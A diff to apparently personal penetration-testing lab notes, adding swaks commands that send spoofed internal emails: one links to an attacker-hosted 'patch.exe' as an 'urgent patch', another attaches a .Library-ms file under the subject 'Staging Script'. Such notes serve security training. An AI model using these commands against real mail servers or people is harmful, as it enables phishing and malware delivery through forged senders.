@@ -16,4 +16,6 @@ Testing
 ```
 
 ### swaks to send email
->swaks --to "tharper@victim" --from "rmurray@victim" --ehlo victim --body "Following link is urgent patch link: http://192.168.119.130/patch.exe" --header "Subject:urgent patch" --server 192.168.130.55
+swaks --to "tharper@victim" --from "rmurray@victim" --ehlo victim --body "Following link is urgent patch link: http://192.168.119.130/patch.exe" --header "Subject:urgent patch" --server 192.168.130.55(email server)
+
+swaks --to jim@relia.com --from maildmz@relia.com --server 192.168.193.189 --attach /home/kali/Desktop/config.Library-ms --body "Please take a look at the config library file" --header "Subject: Staging Script"
